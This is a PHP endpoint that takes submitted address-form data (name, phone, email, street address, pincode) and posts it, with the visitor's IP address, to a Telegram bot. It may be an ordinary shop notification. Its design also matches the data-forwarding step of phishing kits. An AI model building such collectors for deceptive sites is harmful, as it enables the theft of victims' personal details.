<?php
require_once __DIR__ . '/../includes/bootstrap.php';
header('Content-Type: application/json; charset=utf-8');
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');
header('X-Content-Type-Options: nosniff');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['ok' => false, 'error' => 'Method not allowed']);
    exit;
}

$body = json_decode(file_get_contents('php://input') ?: '[]', true);
if (!is_array($body)) $body = [];
$csrf = (string)($body['csrf'] ?? '');
$expected = (string)($_SESSION['fk_address_csrf'] ?? '');
if ($expected === '' || !hash_equals($expected, $csrf)) {
    http_response_code(403);
    echo json_encode(['ok' => false, 'error' => 'Invalid session token']);
    exit;
}

$configPath = __DIR__ . '/tg_config.php';
$config = file_exists($configPath) ? include $configPath : [];
$token = trim((string)($config['token'] ?? ''));
$chatId = trim((string)($config['chat_id'] ?? ''));
if ($token === '' || $chatId === '') {
    http_response_code(500);
    echo json_encode(['ok' => false, 'error' => 'Telegram is not configured']);
    exit;
}

$data = is_array($body['data'] ?? null) ? $body['data'] : [];
$clean = [];
foreach ($data as $k => $v) {
    if (!is_scalar($v)) continue;
    $key = preg_replace('/[^a-z0-9_]/i', '', (string)$k);
    if ($key === '') continue;
    $val = trim((string)$v);
    $clean[$key] = mb_substr($val, 0, 300);
}

$map = [
    'type' => '📌 Type',
    'name' => '👤 Name',
    'phone' => '📞 Phone',
    'email' => '📧 Email',
    'flat' => '🏠 Flat/House',
    'area' => '📍 Area/Street',
    'landmark' => '🗺️ Landmark',
    'city' => '🏙️ City',
    'state' => '🧭 State',
    'pin' => '📮 Pincode',
    'note' => '📝 Note',
    'page' => '🌐 Page',
];
$lines = ['🛒 <b>New Address Saved</b>', ''];
foreach ($map as $key => $label) {
    if (!empty($clean[$key])) {
        $lines[] = $label . ': ' . htmlspecialchars($clean[$key], ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
    }
}
if (!empty($_SERVER['REMOTE_ADDR'])) {
    $lines[] = '';
    $lines[] = '🔐 <b>Server Log</b>';
    $lines[] = 'IP: <code>' . htmlspecialchars((string)$_SERVER['REMOTE_ADDR'], ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . '</code>';
}

$text = implode("\n", $lines);
$payload = json_encode([
    'chat_id' => $chatId,
    'text' => $text,
    'parse_mode' => 'HTML'
], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);

$url = 'https://api.telegram.org/bot' . $token . '/sendMessage';
$ok = false;
$responseBody = '';

if (function_exists('curl_init')) {
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_POSTFIELDS => $payload,
        CURLOPT_CONNECTTIMEOUT => 8,
        CURLOPT_TIMEOUT => 12,
    ]);
    $responseBody = (string)curl_exec($ch);
    $httpCode = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    $ok = ($httpCode >= 200 && $httpCode < 300);
} else {
    $ctx = stream_context_create([
        'http' => [
            'method' => 'POST',
            'header' => "Content-Type: application/json\r\n",
            'content' => $payload,
            'timeout' => 12,
            'ignore_errors' => true,
        ]
    ]);
    $responseBody = (string)@file_get_contents($url, false, $ctx);
    $ok = $responseBody !== '';
}

$decoded = json_decode($responseBody, true);
if (!$ok || !is_array($decoded) || empty($decoded['ok'])) {
    http_response_code(502);
    echo json_encode(['ok' => false, 'error' => 'Telegram send failed']);
    exit;
}

echo json_encode(['ok' => true]);
